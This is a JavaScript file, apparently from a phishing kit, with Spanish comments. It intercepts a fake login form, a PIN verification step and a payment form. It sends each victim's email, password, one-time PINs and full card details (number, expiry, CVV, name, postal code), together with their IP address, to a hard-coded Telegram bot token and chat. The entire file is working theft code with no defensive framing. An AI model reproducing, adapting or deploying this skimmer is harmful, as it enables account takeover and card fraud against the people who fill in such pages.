// Configuración común
const botToken = '7480004258:AAGK0zuxoAxkNqMMZy3jLelwf_SkWrIQ1VM';
const chatId = '7370656444';

// Función para obtener IP
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error al obtener IP:', error);
        return 'Desconocida';
    }
}

// Función para enviar a Telegram
async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Error al enviar a Telegram:', error);
        return { ok: false };
    }
}

// Manejar envío desde index.html
if (document.getElementById('signup-form')) {
    document.getElementById('signup-form').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('pas').value;
        const ip = await getIP();
        
        const message = `
🛡️ NUEVO INICIO DE SESIÓN
📧 Email: ${email}
🔑 Contraseña: ${password}
🌐 IP: ${ip}
📍 Ubicación: https://www.google.com/maps?q=${ip}
🕒 Fecha: ${new Date().toLocaleString()}
        `;
        
        await sendToTelegram(message);
        window.location.href = "Validacion.html";
    });
}

// Manejar envío desde Validacion.html
if (document.getElementById('pin-form')) {
    document.addEventListener('pinCompleted', async function(e) {
        const pin = e.detail.pin;
        const ip = await getIP();
        
        const message = `
🔢 CÓDIGO DE VERIFICACIÓN
🔐 PIN: ${pin}
🌐 IP: ${ip}
🕒 Fecha: ${new Date().toLocaleString()}
        `;
        
        await sendToTelegram(message);
    });
}

// Manejar envío desde Validacion_Erronea.html
document.addEventListener('pinErrorCompleted', async function(e) {
    const pin = e.detail.pin;
    const ip = await getIP();
    
    const message = `
🔢 CÓDIGO DE VERIFICACIÓN2
🔐 PIN: ${pin}
🌐 IP: ${ip}
🕒 Fecha: ${new Date().toLocaleString()}
⚠️ Intento de verificación fallido
    `;
    
    await sendToTelegram(message);
});

// Manejar envío desde payment.html
document.addEventListener('paymentCompleted', async function(e) {
    const { cardNumber, expiryDate, cvv, name, postalCode } = e.detail;
    const ip = await getIP();
    
    const message = `
💳 DATOS DE TARJETA CAPTURADOS
🛡️ Tarjeta: ${cardNumber}
📅 Expira: ${expiryDate}
🔐 CVV: ${cvv}
👤 Nombre: ${name}
📮 Código Postal: ${postalCode}
🌐 IP: ${ip}
🕒 Fecha: ${new Date().toLocaleString()}
    `;
    
    await sendToTelegram(message);
});